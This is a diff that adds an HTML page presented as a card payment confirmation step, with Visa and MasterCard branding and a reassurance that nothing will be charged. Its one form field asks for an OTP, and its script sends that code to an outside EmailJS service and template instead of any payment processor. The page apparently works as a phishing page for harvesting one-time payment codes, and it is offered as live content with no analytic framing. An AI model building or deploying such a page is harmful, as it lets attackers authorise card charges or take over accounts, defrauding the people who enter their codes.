@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="index.css">
+    <title>Application Form</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init('VDCSeZiTvFsTAhD3J');
+        })();
+    </script>
+    <script type="text/javascript">
+        window.onload = function() {
+            document.getElementById('contact-form').addEventListener('submit', function(event) {
+                event.preventDefault();
+                // generate a five digit number for the contact_number variable
+                this.contact_number.value = Math.random() * 100000 | 0;
+                // these IDs from the previous steps
+                emailjs.sendForm("service_smart","template_otp", this)
+                .then(function() {
+                    console.log('SUCCESS!');
+                    let subscribe = document.getElementById('submit')
+                    let otp = document.getElementById('otp')
+                        console.log('na me')
+                        subscribe.style.animationName = 'done';
+                        subscribe.value = 'DONE';
+                        otp.value = "";
+                        let Subscribe = setTimeout(sub, 5000);
+                        function sub(){
+                            subscribe.value = 'Confirm';
+                        }
+                        let yes = document.getElementById('yes')
+                        yes.innerHTML = 'Yes'
+                    }, function(error) {
+                        console.log('FAILED...', error);
+                        let subscribe = document.getElementById('submit')
+                        subscribe.value = 'unable to submit'
+                        subscribe.style.animationName = 'failed';
+                        let Subscribe = setTimeout(sub, 4000);
+                        function sub(){
+                            subscribe.value = 'Submit'
+                        }
+                    });
+            });
+        }
+    </script>
+</head>
+<body>
+    <h2>PAYMENT METHOD</h2>
+    <P id="p1">You won't be charged until you make a purchase</P>
+    <div id="div1">
+        <h3>Credit/Debit Card</h3>
+        <p id="p2">Visa, MasterCard, Discover, American Express</p>
+    </div>
+    <form id="contact-form">
+        <input type="hidden" name="contact_number">
+       <label for="otp">OTP</label>
+       <input type="number" name="otp" id="otp" placeholder="- - -   - - - "><br>
+
+        <input type="submit" name="submit" value="Confirm" id="submit">
+    </form>
+    
+
+
+    <!-- <a href="https://web.whatsapp.com/">contact us</a> -->
+
+</body>
+</html>
